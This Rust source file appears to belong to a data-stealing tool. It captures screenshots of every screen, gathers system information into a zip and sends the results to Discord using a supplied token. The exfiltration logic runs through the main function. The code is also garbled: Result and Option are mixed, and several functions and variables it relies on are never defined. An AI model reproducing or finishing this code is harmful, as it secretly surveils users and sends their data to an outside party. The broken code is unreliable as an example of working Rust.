use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
use super::{
    discord, global, zip
};

struct Files {}
impl Files {
    pub fn new() -> Self {
        return Self 
    }

    // Create a new file
    pub fn mkdir(path: &str) -> Result<_, Error> {
        return match std::fs::create_dir_all(path) {
            Ok(_) => Ok(()),
            Err(e) => Err(e)
        };
    }

    pub fn read_file(&self, path: &str) -> Result<Vec<u8>, Error> {
        return match std::fs::read(path) {
            Ok(f) => Some(f),
            Err(e) => Err(e)
        }
    }

    pub fn encode_png(&self, buf: &[u8]) -> Result<String, Error> {
        return match base64::encode(buf) {
            Ok(f) => Some(format!(
                "data:image/png;base64,{f}",
            )),
            Err(e) => Err(e)
        }
    }

    // Capture a screenshot and save it to the current folder
    fn capture_image(time: &str) -> Result<&Vec<u8>, Error> {
        let screens = match screenshots::Screen::all() {
            Some(s) => s,
            None => Err("failed to get screens")
        };

        // Iterate through all the screens
        let mut buf: &Vec<u8> = &Vec::new();
        screens.iter().for_each(|s| {
            buf = match s.capture() {
                Ok(f) => f.buffer(),
                Err(e) => Err(e)
            }
        });
        return Ok(buf);
    }
}


/*

    https://crates.io/crates/file-lock
    https://crates.io/crates/sysinfo

*/

// Main function for testing
//
// token: The provided vac token
fn main(token: &str) {
    //////////////////////////////////
    //                              //
    //  The below is in the thread  //
    //                              //
    //////////////////////////////////

    // Create a new system struct
    let mut sys: System = System::new_all();

    // Take a scrteenshot
    let img_buf: String = capture_screenshot(&mut zip, &time);

    // Get the system information
    get_sys_info(&mut zip, &mut sys, &time);

    // Send the files to discord
    
    discord::send_files(token, &image_data, &zip_data);
}
